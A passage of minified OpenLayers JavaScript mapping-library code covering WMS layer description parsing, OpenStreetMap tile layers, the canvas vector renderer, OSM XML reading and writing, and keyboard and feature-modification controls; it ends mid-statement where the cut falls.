a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));for(var b=a.documentElement.childNodes,c={layerDescriptions:[]},d,e,f=0;f<b.length;++f)if(d=b[f],e=d.nodeName,\"LayerDescription\"==e){e=d.getAttribute(\"name\");var g=\"\",h=\"\",k=\"\";d.getAttribute(\"owsType\")?(g=d.getAttribute(\"owsType\"),\nh=d.getAttribute(\"owsURL\")):\"\"!=d.getAttribute(\"wfs\")?(g=\"WFS\",h=d.getAttribute(\"wfs\")):\"\"!=d.getAttribute(\"wcs\")&&(g=\"WCS\",h=d.getAttribute(\"wcs\"));d=d.getElementsByTagName(\"Query\");0<d.length&&((k=d[0].getAttribute(\"typeName\"))||(k=d[0].getAttribute(\"typename\")));d={layerName:e,owsType:g,owsURL:h,typeName:k};c.layerDescriptions.push(d);c.length=c.layerDescriptions.length;c[c.length-1]=d}else if(\"ServiceException\"==e)return{error:(new OpenLayers.Format.OGCExceptionReport).read(a)};return c},CLASS_NAME:\"OpenLayers.Format.WMSDescribeLayer.v1_1_1\"});\nOpenLayers.Format.WMSDescribeLayer.v1_1_0=OpenLayers.Format.WMSDescribeLayer.v1_1_1;OpenLayers.Layer.XYZ=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,sphericalMercator:!1,zoomOffset:0,serverResolutions:null,initialize:function(a,b,c){if(c&&c.sphericalMercator||this.sphericalMercator)c=OpenLayers.Util.extend({projection:\"EPSG:900913\",numZoomLevels:19},c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a||this.name,b||this.url,{},c])},clone:function(a){null==a&&(a=new OpenLayers.Layer.XYZ(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,\n[a])},getURL:function(a){a=this.getXYZ(a);var b=this.url;OpenLayers.Util.isArray(b)&&(b=this.selectUrl(\"\"+a.x+a.y+a.z,b));return OpenLayers.String.format(b,a)},getXYZ:function(a){var b=this.getServerResolution(),c=Math.round((a.left-this.maxExtent.left)/(b*this.tileSize.w));a=Math.round((this.maxExtent.top-a.top)/(b*this.tileSize.h));b=this.getServerZoom();if(this.wrapDateLine)var d=Math.pow(2,b),c=(c%d+d)%d;return{x:c,y:a,z:b}},setMap:function(a){OpenLayers.Layer.Grid.prototype.setMap.apply(this,\narguments);this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.maxExtent.left,this.maxExtent.bottom))},CLASS_NAME:\"OpenLayers.Layer.XYZ\"});OpenLayers.Layer.OSM=OpenLayers.Class(OpenLayers.Layer.XYZ,{name:\"OpenStreetMap\",url:[\"http://a.tile.openstreetmap.org/${z}/${x}/${y}.png\",\"http://b.tile.openstreetmap.org/${z}/${x}/${y}.png\",\"http://c.tile.openstreetmap.org/${z}/${x}/${y}.png\"],attribution:\"&copy; <a href='http://www.openstreetmap.org/copyright'>OpenStreetMap</a> contributors\",sphericalMercator:!0,wrapDateLine:!0,tileOptions:null,initialize:function(a,b,c){OpenLayers.Layer.XYZ.prototype.initialize.apply(this,arguments);this.tileOptions=\nOpenLayers.Util.extend({crossOriginKeyword:\"anonymous\"},this.options&&this.options.tileOptions)},clone:function(a){null==a&&(a=new OpenLayers.Layer.OSM(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])},CLASS_NAME:\"OpenLayers.Layer.OSM\"});OpenLayers.Renderer=OpenLayers.Class({container:null,root:null,extent:null,locked:!1,size:null,resolution:null,map:null,featureDx:0,initialize:function(a,b){this.container=OpenLayers.Util.getElement(a);OpenLayers.Util.extend(this,b)},destroy:function(){this.map=this.resolution=this.size=this.extent=this.container=null},supported:function(){return!1},setExtent:function(a,b){this.extent=a.clone();if(this.map.baseLayer&&this.map.baseLayer.wrapDateLine){var c=a.getWidth()/this.map.getExtent().getWidth();\na=a.scale(1/c);this.extent=a.wrapDateLine(this.map.getMaxExtent()).scale(c)}b&&(this.resolution=null);return!0},setSize:function(a){this.size=a.clone();this.resolution=null},getResolution:function(){return this.resolution=this.resolution||this.map.getResolution()},drawFeature:function(a,b){null==b&&(b=a.style);if(a.geometry){var c=a.geometry.getBounds();if(c){var d;this.map.baseLayer&&this.map.baseLayer.wrapDateLine&&(d=this.map.getMaxExtent());c.intersectsBounds(this.extent,{worldBounds:d})?this.calculateFeatureDx(c,\nd):b={display:\"none\"};c=this.drawGeometry(a.geometry,b,a.id);if(\"none\"!=b.display&&b.label&&!1!==c){d=a.geometry.getCentroid();if(b.labelXOffset||b.labelYOffset){var e=isNaN(b.labelXOffset)?0:b.labelXOffset,f=isNaN(b.labelYOffset)?0:b.labelYOffset,g=this.getResolution();d.move(e*g,f*g)}this.drawText(a.id,b,d)}else this.removeText(a.id);return c}}},calculateFeatureDx:function(a,b){this.featureDx=0;if(b){var c=b.getWidth();this.featureDx=Math.round(((a.left+a.right)/2-(this.extent.left+this.extent.right)/\n2)/c)*c}},drawGeometry:function(a,b,c){},drawText:function(a,b,c){},removeText:function(a){},clear:function(){},getFeatureIdFromEvent:function(a){},eraseFeatures:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0,c=a.length;b<c;++b){var d=a[b];this.eraseGeometry(d.geometry,d.id);this.removeText(d.id)}},eraseGeometry:function(a,b){},moveRoot:function(a){},getRenderLayerId:function(){return this.container.id},applyDefaultSymbolizer:function(a){var b=OpenLayers.Util.extend({},OpenLayers.Renderer.defaultSymbolizer);\n!1===a.stroke&&(delete b.strokeWidth,delete b.strokeColor);!1===a.fill&&delete b.fillColor;OpenLayers.Util.extend(b,a);return b},CLASS_NAME:\"OpenLayers.Renderer\"});OpenLayers.Renderer.defaultSymbolizer={fillColor:\"#000000\",strokeColor:\"#000000\",strokeWidth:2,fillOpacity:1,strokeOpacity:1,pointRadius:0,labelAlign:\"cm\"};\nOpenLayers.Renderer.symbol={star:[350,75,379,161,469,161,397,215,423,301,350,250,277,301,303,215,231,161,321,161,350,75],cross:[4,0,6,0,6,4,10,4,10,6,6,6,6,10,4,10,4,6,0,6,0,4,4,4,4,0],x:[0,0,25,0,50,35,75,0,100,0,65,50,100,100,75,100,50,65,25,100,0,100,35,50,0,0],square:[0,0,0,1,1,1,1,0,0,0],triangle:[0,10,10,10,5,0,0,10]};OpenLayers.Renderer.Canvas=OpenLayers.Class(OpenLayers.Renderer,{hitDetection:!0,hitOverflow:0,canvas:null,features:null,pendingRedraw:!1,cachedSymbolBounds:{},initialize:function(a,b){OpenLayers.Renderer.prototype.initialize.apply(this,arguments);this.root=document.createElement(\"canvas\");this.container.appendChild(this.root);this.canvas=this.root.getContext(\"2d\");this.features={};this.hitDetection&&(this.hitCanvas=document.createElement(\"canvas\"),this.hitContext=this.hitCanvas.getContext(\"2d\"))},\nsetExtent:function(){OpenLayers.Renderer.prototype.setExtent.apply(this,arguments);return!1},eraseGeometry:function(a,b){this.eraseFeatures(this.features[b][0])},supported:function(){return OpenLayers.CANVAS_SUPPORTED},setSize:function(a){this.size=a.clone();var b=this.root;b.style.width=a.w+\"px\";b.style.height=a.h+\"px\";b.width=a.w;b.height=a.h;this.resolution=null;this.hitDetection&&(b=this.hitCanvas,b.style.width=a.w+\"px\",b.style.height=a.h+\"px\",b.width=a.w,b.height=a.h)},drawFeature:function(a,\nb){var c;if(a.geometry){b=this.applyDefaultSymbolizer(b||a.style);c=a.geometry.getBounds();var d;this.map.baseLayer&&this.map.baseLayer.wrapDateLine&&(d=this.map.getMaxExtent());d=c&&c.intersectsBounds(this.extent,{worldBounds:d});(c=\"none\"!==b.display&&!!c&&d)?this.features[a.id]=[a,b]:delete this.features[a.id];this.pendingRedraw=!0}this.pendingRedraw&&!this.locked&&(this.redraw(),this.pendingRedraw=!1);return c},drawGeometry:function(a,b,c){var d=a.CLASS_NAME;if(\"OpenLayers.Geometry.Collection\"==\nd||\"OpenLayers.Geometry.MultiPoint\"==d||\"OpenLayers.Geometry.MultiLineString\"==d||\"OpenLayers.Geometry.MultiPolygon\"==d)for(d=0;d<a.components.length;d++)this.drawGeometry(a.components[d],b,c);else switch(a.CLASS_NAME){case \"OpenLayers.Geometry.Point\":this.drawPoint(a,b,c);break;case \"OpenLayers.Geometry.LineString\":this.drawLineString(a,b,c);break;case \"OpenLayers.Geometry.LinearRing\":this.drawLinearRing(a,b,c);break;case \"OpenLayers.Geometry.Polygon\":this.drawPolygon(a,b,c)}},drawExternalGraphic:function(a,\nb,c){var d=new Image,e=b.title||b.graphicTitle;e&&(d.title=e);var f=b.graphicWidth||b.graphicHeight,g=b.graphicHeight||b.graphicWidth,f=f?f:2*b.pointRadius,g=g?g:2*b.pointRadius,h=void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*f),k=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*g),l=b.graphicOpacity||b.fillOpacity;d.onload=OpenLayers.Function.bind(function(){if(this.features[c]){var b=this.getLocalXY(a),e=b[0],b=b[1];if(!isNaN(e)&&!isNaN(b)){var e=e+h|0,b=b+k|0,p=this.canvas;p.globalAlpha=l;var q=\nOpenLayers.Renderer.Canvas.drawImageScaleFactor||(OpenLayers.Renderer.Canvas.drawImageScaleFactor=/android 2.1/.test(navigator.userAgent.toLowerCase())?320/window.screen.width:1);p.drawImage(d,e*q,b*q,f*q,g*q);this.hitDetection&&(this.setHitContextStyle(\"fill\",c),this.hitContext.fillRect(e,b,f,g))}}},this);d.src=b.externalGraphic},drawNamedSymbol:function(a,b,c){var d,e,f,g;f=Math.PI/180;var h=OpenLayers.Renderer.symbol[b.graphicName];if(!h)throw Error(b.graphicName+\" is not a valid symbol name\");\nif(!(!h.length||2>h.length||(a=this.getLocalXY(a),e=a[0],g=a[1],isNaN(e)||isNaN(g)))){this.canvas.lineCap=\"round\";this.canvas.lineJoin=\"round\";this.hitDetection&&(this.hitContext.lineCap=\"round\",this.hitContext.lineJoin=\"round\");if(b.graphicName in this.cachedSymbolBounds)d=this.cachedSymbolBounds[b.graphicName];else{d=new OpenLayers.Bounds;for(a=0;a<h.length;a+=2)d.extend(new OpenLayers.LonLat(h[a],h[a+1]));this.cachedSymbolBounds[b.graphicName]=d}this.canvas.save();this.hitDetection&&this.hitContext.save();\nthis.canvas.translate(e,g);this.hitDetection&&this.hitContext.translate(e,g);a=f*b.rotation;isNaN(a)||(this.canvas.rotate(a),this.hitDetection&&this.hitContext.rotate(a));f=2*b.pointRadius/Math.max(d.getWidth(),d.getHeight());this.canvas.scale(f,f);this.hitDetection&&this.hitContext.scale(f,f);a=d.getCenterLonLat().lon;d=d.getCenterLonLat().lat;this.canvas.translate(-a,-d);this.hitDetection&&this.hitContext.translate(-a,-d);g=b.strokeWidth;b.strokeWidth=g/f;if(!1!==b.fill){this.setCanvasStyle(\"fill\",\nb);this.canvas.beginPath();for(a=0;a<h.length;a+=2)d=h[a],e=h[a+1],0==a&&this.canvas.moveTo(d,e),this.canvas.lineTo(d,e);this.canvas.closePath();this.canvas.fill();if(this.hitDetection){this.setHitContextStyle(\"fill\",c,b);this.hitContext.beginPath();for(a=0;a<h.length;a+=2)d=h[a],e=h[a+1],0==a&&this.canvas.moveTo(d,e),this.hitContext.lineTo(d,e);this.hitContext.closePath();this.hitContext.fill()}}if(!1!==b.stroke){this.setCanvasStyle(\"stroke\",b);this.canvas.beginPath();for(a=0;a<h.length;a+=2)d=h[a],\ne=h[a+1],0==a&&this.canvas.moveTo(d,e),this.canvas.lineTo(d,e);this.canvas.closePath();this.canvas.stroke();if(this.hitDetection){this.setHitContextStyle(\"stroke\",c,b,f);this.hitContext.beginPath();for(a=0;a<h.length;a+=2)d=h[a],e=h[a+1],0==a&&this.hitContext.moveTo(d,e),this.hitContext.lineTo(d,e);this.hitContext.closePath();this.hitContext.stroke()}}b.strokeWidth=g;this.canvas.restore();this.hitDetection&&this.hitContext.restore();this.setCanvasStyle(\"reset\")}},setCanvasStyle:function(a,b){\"fill\"===\na?(this.canvas.globalAlpha=b.fillOpacity,this.canvas.fillStyle=b.fillColor):\"stroke\"===a?(this.canvas.globalAlpha=b.strokeOpacity,this.canvas.strokeStyle=b.strokeColor,this.canvas.lineWidth=b.strokeWidth):(this.canvas.globalAlpha=0,this.canvas.lineWidth=1)},featureIdToHex:function(a){a=Number(a.split(\"_\").pop())+1;16777216<=a&&(this.hitOverflow=a-16777215,a=a%16777216+1);a=\"000000\"+a.toString(16);var b=a.length;return a=\"#\"+a.substring(b-6,b)},setHitContextStyle:function(a,b,c,d){b=this.featureIdToHex(b);\n\"fill\"==a?(this.hitContext.globalAlpha=1,this.hitContext.fillStyle=b):\"stroke\"==a?(this.hitContext.globalAlpha=1,this.hitContext.strokeStyle=b,\"undefined\"===typeof d?this.hitContext.lineWidth=c.strokeWidth+2:isNaN(d)||(this.hitContext.lineWidth=c.strokeWidth+2/d)):(this.hitContext.globalAlpha=0,this.hitContext.lineWidth=1)},drawPoint:function(a,b,c){if(!1!==b.graphic)if(b.externalGraphic)this.drawExternalGraphic(a,b,c);else if(b.graphicName&&\"circle\"!=b.graphicName)this.drawNamedSymbol(a,b,c);else{var d=\nthis.getLocalXY(a);a=d[0];d=d[1];if(!isNaN(a)&&!isNaN(d)){var e=2*Math.PI,f=b.pointRadius;!1!==b.fill&&(this.setCanvasStyle(\"fill\",b),this.canvas.beginPath(),this.canvas.arc(a,d,f,0,e,!0),this.canvas.fill(),this.hitDetection&&(this.setHitContextStyle(\"fill\",c,b),this.hitContext.beginPath(),this.hitContext.arc(a,d,f,0,e,!0),this.hitContext.fill()));!1!==b.stroke&&(this.setCanvasStyle(\"stroke\",b),this.canvas.beginPath(),this.canvas.arc(a,d,f,0,e,!0),this.canvas.stroke(),this.hitDetection&&(this.setHitContextStyle(\"stroke\",\nc,b),this.hitContext.beginPath(),this.hitContext.arc(a,d,f,0,e,!0),this.hitContext.stroke()),this.setCanvasStyle(\"reset\"))}}},drawLineString:function(a,b,c){b=OpenLayers.Util.applyDefaults({fill:!1},b);this.drawLinearRing(a,b,c)},drawLinearRing:function(a,b,c){!1!==b.fill&&(this.setCanvasStyle(\"fill\",b),this.renderPath(this.canvas,a,b,c,\"fill\"),this.hitDetection&&(this.setHitContextStyle(\"fill\",c,b),this.renderPath(this.hitContext,a,b,c,\"fill\")));!1!==b.stroke&&(this.setCanvasStyle(\"stroke\",b),this.renderPath(this.canvas,\na,b,c,\"stroke\"),this.hitDetection&&(this.setHitContextStyle(\"stroke\",c,b),this.renderPath(this.hitContext,a,b,c,\"stroke\")));this.setCanvasStyle(\"reset\")},renderPath:function(a,b,c,d,e){b=b.components;c=b.length;a.beginPath();d=this.getLocalXY(b[0]);var f=d[1];if(!isNaN(d[0])&&!isNaN(f)){a.moveTo(d[0],d[1]);for(d=1;d<c;++d)f=this.getLocalXY(b[d]),a.lineTo(f[0],f[1]);\"fill\"===e?a.fill():a.stroke()}},drawPolygon:function(a,b,c){a=a.components;var d=a.length;this.drawLinearRing(a[0],b,c);for(var e=1;e<\nd;++e)this.canvas.globalCompositeOperation=\"destination-out\",this.hitDetection&&(this.hitContext.globalCompositeOperation=\"destination-out\"),this.drawLinearRing(a[e],OpenLayers.Util.applyDefaults({stroke:!1,fillOpacity:1},b),c),this.canvas.globalCompositeOperation=\"source-over\",this.hitDetection&&(this.hitContext.globalCompositeOperation=\"source-over\"),this.drawLinearRing(a[e],OpenLayers.Util.applyDefaults({fill:!1},b),c)},drawText:function(a,b){var c=this.getLocalXY(a);this.setCanvasStyle(\"reset\");\nthis.canvas.fillStyle=b.fontColor;this.canvas.globalAlpha=b.fontOpacity||1;var d=[b.fontStyle?b.fontStyle:\"normal\",\"normal\",b.fontWeight?b.fontWeight:\"normal\",b.fontSize?b.fontSize:\"1em\",b.fontFamily?b.fontFamily:\"sans-serif\"].join(\" \"),e=b.label.split(\"\\n\"),f=e.length;if(this.canvas.fillText){this.canvas.font=d;this.canvas.textAlign=OpenLayers.Renderer.Canvas.LABEL_ALIGN[b.labelAlign[0]]||\"center\";this.canvas.textBaseline=OpenLayers.Renderer.Canvas.LABEL_ALIGN[b.labelAlign[1]]||\"middle\";var g=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[1]];\nnull==g&&(g=-0.5);d=this.canvas.measureText(\"Mg\").height||this.canvas.measureText(\"xx\").width;c[1]+=d*g*(f-1);for(g=0;g<f;g++)b.labelOutlineWidth&&(this.canvas.save(),this.canvas.globalAlpha=b.labelOutlineOpacity||b.fontOpacity||1,this.canvas.strokeStyle=b.labelOutlineColor,this.canvas.lineWidth=b.labelOutlineWidth,this.canvas.strokeText(e[g],c[0],c[1]+d*g+1),this.canvas.restore()),this.canvas.fillText(e[g],c[0],c[1]+d*g)}else if(this.canvas.mozDrawText){this.canvas.mozTextStyle=d;var h=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[0]];\nnull==h&&(h=-0.5);g=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[1]];null==g&&(g=-0.5);d=this.canvas.mozMeasureText(\"xx\");c[1]+=d*(1+g*f);for(g=0;g<f;g++){var k=c[0]+h*this.canvas.mozMeasureText(e[g]),l=c[1]+g*d;this.canvas.translate(k,l);this.canvas.mozDrawText(e[g]);this.canvas.translate(-k,-l)}}this.setCanvasStyle(\"reset\")},getLocalXY:function(a){var b=this.getResolution(),c=this.extent;return[(a.x-this.featureDx)/b+-c.left/b,c.top/b-a.y/b]},clear:function(){var a=this.root.height,b=this.root.width;\nthis.canvas.clearRect(0,0,b,a);this.features={};this.hitDetection&&this.hitContext.clearRect(0,0,b,a)},getFeatureIdFromEvent:function(a){var b;if(this.hitDetection&&\"none\"!==this.root.style.display&&!this.map.dragging&&(a=a.xy,a=this.hitContext.getImageData(a.x|0,a.y|0,1,1).data,255===a[3]&&(a=a[2]+256*(a[1]+256*a[0])))){a=\"OpenLayers_Feature_Vector_\"+(a-1+this.hitOverflow);try{b=this.features[a][0]}catch(c){}}return b},eraseFeatures:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0;b<a.length;++b)delete this.features[a[b].id];\nthis.redraw()},redraw:function(){if(!this.locked){var a=this.root.height,b=this.root.width;this.canvas.clearRect(0,0,b,a);this.hitDetection&&this.hitContext.clearRect(0,0,b,a);var a=[],c,d,e=this.map.baseLayer&&this.map.baseLayer.wrapDateLine&&this.map.getMaxExtent(),f;for(f in this.features)this.features.hasOwnProperty(f)&&(b=this.features[f][0],c=b.geometry,this.calculateFeatureDx(c.getBounds(),e),d=this.features[f][1],this.drawGeometry(c,d,b.id),d.label&&a.push([b,d]));b=0;for(c=a.length;b<c;++b)f=\na[b],this.drawText(f[0].geometry.getCentroid(),f[1])}},CLASS_NAME:\"OpenLayers.Renderer.Canvas\"});OpenLayers.Renderer.Canvas.LABEL_ALIGN={l:\"left\",r:\"right\",t:\"top\",b:\"bottom\"};OpenLayers.Renderer.Canvas.LABEL_FACTOR={l:0,r:-1,t:0,b:-1};OpenLayers.Renderer.Canvas.drawImageScaleFactor=null;OpenLayers.Format.OSM=OpenLayers.Class(OpenLayers.Format.XML,{checkTags:!1,interestingTagsExclude:null,areaTags:null,initialize:function(a){var b={interestingTagsExclude:\"source source_ref source:ref history attribution created_by\".split(\" \"),areaTags:\"area building leisure tourism ruins historic landuse military natural sport\".split(\" \")},b=OpenLayers.Util.extend(b,a),c={};for(a=0;a<b.interestingTagsExclude.length;a++)c[b.interestingTagsExclude[a]]=!0;b.interestingTagsExclude=c;c={};for(a=0;a<b.areaTags.length;a++)c[b.areaTags[a]]=\n!0;b.areaTags=c;this.externalProjection=new OpenLayers.Projection(\"EPSG:4326\");OpenLayers.Format.XML.prototype.initialize.apply(this,[b])},read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=this.getNodes(a),c=this.getWays(a);a=Array(c.length);for(var d=0;d<c.length;d++){for(var e=Array(c[d].nodes.length),f=this.isWayArea(c[d])?1:0,g=0;g<c[d].nodes.length;g++){var h=b[c[d].nodes[g]],k=new OpenLayers.Geometry.Point(h.lon,h.lat);k.osm_id=parseInt(c[d].nodes[g]);\ne[g]=k;h.used=!0}h=null;h=f?new OpenLayers.Geometry.Polygon(new OpenLayers.Geometry.LinearRing(e)):new OpenLayers.Geometry.LineString(e);this.internalProjection&&this.externalProjection&&h.transform(this.externalProjection,this.internalProjection);e=new OpenLayers.Feature.Vector(h,c[d].tags);e.osm_id=parseInt(c[d].id);e.fid=\"way.\"+e.osm_id;a[d]=e}for(var l in b){h=b[l];if(!h.used||this.checkTags){c=null;if(this.checkTags){c=this.getTags(h.node,!0);if(h.used&&!c[1])continue;c=c[0]}else c=this.getTags(h.node);\ne=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(h.lon,h.lat),c);this.internalProjection&&this.externalProjection&&e.geometry.transform(this.externalProjection,this.internalProjection);e.osm_id=parseInt(l);e.fid=\"node.\"+e.osm_id;a.push(e)}h.node=null}return a},getNodes:function(a){a=a.getElementsByTagName(\"node\");for(var b={},c=0;c<a.length;c++){var d=a[c],e=d.getAttribute(\"id\");b[e]={lat:d.getAttribute(\"lat\"),lon:d.getAttribute(\"lon\"),node:d}}return b},getWays:function(a){a=a.getElementsByTagName(\"way\");\nfor(var b=[],c=0;c<a.length;c++){var d=a[c],e={id:d.getAttribute(\"id\")};e.tags=this.getTags(d);d=d.getElementsByTagName(\"nd\");e.nodes=Array(d.length);for(var f=0;f<d.length;f++)e.nodes[f]=d[f].getAttribute(\"ref\");b.push(e)}return b},getTags:function(a,b){for(var c=a.getElementsByTagName(\"tag\"),d={},e=!1,f=0;f<c.length;f++){var g=c[f].getAttribute(\"k\");d[g]=c[f].getAttribute(\"v\");b&&(this.interestingTagsExclude[g]||(e=!0))}return b?[d,e]:d},isWayArea:function(a){var b=!1,c=!1;a.nodes[0]==a.nodes[a.nodes.length-\n1]&&(b=!0);if(this.checkTags)for(var d in a.tags)if(this.areaTags[d]){c=!0;break}return b&&(this.checkTags?c:!0)},write:function(a){OpenLayers.Util.isArray(a)||(a=[a]);this.osm_id=1;this.created_nodes={};var b=this.createElementNS(null,\"osm\");b.setAttribute(\"version\",\"0.5\");b.setAttribute(\"generator\",\"OpenLayers \"+OpenLayers.VERSION_NUMBER);for(var c=a.length-1;0<=c;c--)for(var d=this.createFeatureNodes(a[c]),e=0;e<d.length;e++)b.appendChild(d[e]);return OpenLayers.Format.XML.prototype.write.apply(this,\n[b])},createFeatureNodes:function(a){var b=[],c=a.geometry.CLASS_NAME,c=c.substring(c.lastIndexOf(\".\")+1),c=c.toLowerCase();(c=this.createXML[c])&&(b=c.apply(this,[a]));return b},createXML:{point:function(a){var b=null,c=a.geometry?a.geometry:a;this.internalProjection&&this.externalProjection&&(c=c.clone(),c.transform(this.internalProjection,this.externalProjection));var d=!1;a.osm_id?(b=a.osm_id,this.created_nodes[b]&&(d=!0)):(b=-this.osm_id,this.osm_id++);var e=d?this.created_nodes[b]:this.createElementNS(null,\n\"node\");this.created_nodes[b]=e;e.setAttribute(\"id\",b);e.setAttribute(\"lon\",c.x);e.setAttribute(\"lat\",c.y);a.attributes&&this.serializeTags(a,e);this.setState(a,e);return d?[]:[e]},linestring:function(a){var b,c=[],d=a.geometry;a.osm_id?b=a.osm_id:(b=-this.osm_id,this.osm_id++);var e=this.createElementNS(null,\"way\");e.setAttribute(\"id\",b);for(b=0;b<d.components.length;b++){var f=this.createXML.point.apply(this,[d.components[b]]);if(f.length){var f=f[0],g=f.getAttribute(\"id\");c.push(f)}else g=d.components[b].osm_id,\nf=this.created_nodes[g];this.setState(a,f);f=this.createElementNS(null,\"nd\");f.setAttribute(\"ref\",g);e.appendChild(f)}this.serializeTags(a,e);c.push(e);return c},polygon:function(a){var b=OpenLayers.Util.extend({area:\"yes\"},a.attributes),b=new OpenLayers.Feature.Vector(a.geometry.components[0],b);b.osm_id=a.osm_id;return this.createXML.linestring.apply(this,[b])}},serializeTags:function(a,b){for(var c in a.attributes){var d=this.createElementNS(null,\"tag\");d.setAttribute(\"k\",c);d.setAttribute(\"v\",\na.attributes[c]);b.appendChild(d)}},setState:function(a,b){if(a.state){var c=null;switch(a.state){case OpenLayers.State.UPDATE:case OpenLayers.State.DELETE:c=\"delete\"}c&&b.setAttribute(\"action\",c)}},CLASS_NAME:\"OpenLayers.Format.OSM\"});OpenLayers.Handler.Keyboard=OpenLayers.Class(OpenLayers.Handler,{KEY_EVENTS:[\"keydown\",\"keyup\"],eventListener:null,observeElement:null,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.eventListener=OpenLayers.Function.bindAsEventListener(this.handleKeyEvent,this)},destroy:function(){this.deactivate();this.eventListener=null;OpenLayers.Handler.prototype.destroy.apply(this,arguments)},activate:function(){if(OpenLayers.Handler.prototype.activate.apply(this,\narguments)){this.observeElement=this.observeElement||document;for(var a=0,b=this.KEY_EVENTS.length;a<b;a++)OpenLayers.Event.observe(this.observeElement,this.KEY_EVENTS[a],this.eventListener);return!0}return!1},deactivate:function(){var a=!1;if(OpenLayers.Handler.prototype.deactivate.apply(this,arguments)){for(var a=0,b=this.KEY_EVENTS.length;a<b;a++)OpenLayers.Event.stopObserving(this.observeElement,this.KEY_EVENTS[a],this.eventListener);a=!0}return a},handleKeyEvent:function(a){this.checkModifiers(a)&&\nthis.callback(a.type,[a])},CLASS_NAME:\"OpenLayers.Handler.Keyboard\"});OpenLayers.Control.ModifyFeature=OpenLayers.Class(OpenLayers.Control,{documentDrag:!1,geometryTypes:null,clickout:!0,toggle:!0,standalone:!1,layer:null,feature:null,vertex:null,vertices:null,virtualVertices:null,handlers:null,deleteCodes:null,virtualStyle:null,vertexRenderIntent:null,mode:null,createVertices:!0,modified:!1,radiusHandle:null,dragHandle:null,onModificationStart:function(){},onModification:function(){},onModificationEnd:function(){},initialize:function(a,b){b=b||{};this.layer=a;this.vertices=\n[];this.virtualVertices=[];this.virtualStyle=OpenLayers.Util.extend({},this.layer.style||this.layer.styleMap.createSymbolizer(null,b.vertexRenderIntent));this.virtualStyle.fillOpacity=0.3;this.virtualStyle.strokeOpacity=0.3;this.deleteCodes=[46,68];this.mode=OpenLayers.Control.ModifyFeature.RESHAPE;OpenLayers.Control.prototype.initialize.apply(this,[b]);OpenLayers.Util.isArray(this.deleteCodes)||(this.deleteCodes=[this.deleteCodes]);var c={documentDrag:this.documentDrag,stopDown:!1};this.handlers=\n{keyboard:new OpenLayers.Handler.Keyboard(this,{keydown:this.handleKeypress}),drag:new OpenLayers.Handler.Drag(this,{down:function(a){this.vertex=null;(a=this.layer.getFeatureFromEvent(this.handlers.drag.evt))?this.dragStart(a):this.clickout&&(this._unselect=this.feature)},move:function(a){delete this._unselect;this.vertex&&this.dragVertex(this.vertex,a)},up:function(){this.handlers.drag.stopDown=!1;this._unselect&&(this.unselectFeature(this._unselect),delete this._unselect)},done:function(a){this.vertex&&\nthis.dragComplete(this.vertex)}},c)}},destroy:function(){this.map&&this.map.events.un({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this});this.layer=null;OpenLayers.Control.prototype.destroy.apply(this,[])},activate:function(){this.moveLayerToTop();this.map.events.on({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this});return this.handlers.keyboard.activate()&&this.handlers.drag.activate()&&OpenLayers.Control.prototype.activate.apply(this,arguments)},\ndeactivate:function(){var a=!1;OpenLayers.Control.prototype.deactivate.apply(this,arguments)&&(this.moveLayerBack(),this.map.events.un({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this}),this.layer.removeFeatures(this.vertices,{silent:!0}),this.layer.removeFeatures(this.virtualVertices,{silent:!0}),this.vertices=[],this.handlers.drag.deactivate(),this.handlers.keyboard.deactivate(),(a=this.feature)&&(a.geometry&&a.layer)&&this.unselectFeature(a),a=!0);return a},beforeSelectFeature:function(a){return this.layer.events.triggerEvent(\"beforefeaturemodified\",\n{feature:a})},selectFeature:function(a){if(!(this.feature===a||this.geometryTypes&&-1==OpenLayers.Util.indexOf(this.geometryTypes,a.geometry.CLASS_NAME))){!1!==this.beforeSelectFeature(a)&&(this.feature&&this.unselectFeature(this.feature),this.feature=a,this.layer.selectedFeatures.push(a),this.layer.drawFeature(a,\"select\"),this.modified=!1,this.resetVertices(),this.onModificationStart(this.feature));var b=a.modified;!a.geometry||b&&b.geometry||(this._originalGeometry=a.geometry.clone())}},unselectFeature:function(a){this.layer.removeFeatures(this.vertices,\n{silent:!0});this.vertices=[];this.layer.destroyFeatures(this.virtualVertices,{silent:!0});this.virtualVertices=[];this.dragHandle&&(this.layer.destroyFeatures([this.dragHandle],{silent:!0}),delete this.dragHandle);this.radiusHandle&&(this.layer.destroyFeatures([this.radiusHandle],{silent:!0}),delete this.radiusHandle);this.layer.drawFeature(this.feature,\"default\");this.feature=null;OpenLayers.Util.removeItem(this.layer.selectedFeatures,a);this.onModificationEnd(a);this.layer.events.triggerEvent(\"afterfeaturemodified\",\n{feature:a,modified:this.modified});this.modified=!1},dragStart:function(a){var b=\"OpenLayers.Geometry.Point\"==a.geometry.CLASS_NAME;this.standalone||(a._sketch||!b)&&a._sketch||(this.toggle&&this.feature===a&&(this._unselect=a),this.selectFeature(a));if(a._sketch||b)this.vertex=a,this.handlers.drag.stopDown=!0},dragVertex:function(a,b){var c=this.map.getLonLatFromViewPortPx(b),d=a.geometry;d.move(c.lon-d.x,c.lat-d.y);this.modified=!0;\"OpenLayers.Geometry.Point\"==this.feature.geometry.CLASS_NAME?\nthis.layer.events.triggerEvent(\"vertexmodified\",{vertex:a.geometry,feature:this.feature,pixel:b}):(a._index?(a.geometry.parent.addComponent(a.geometry,a._index),delete 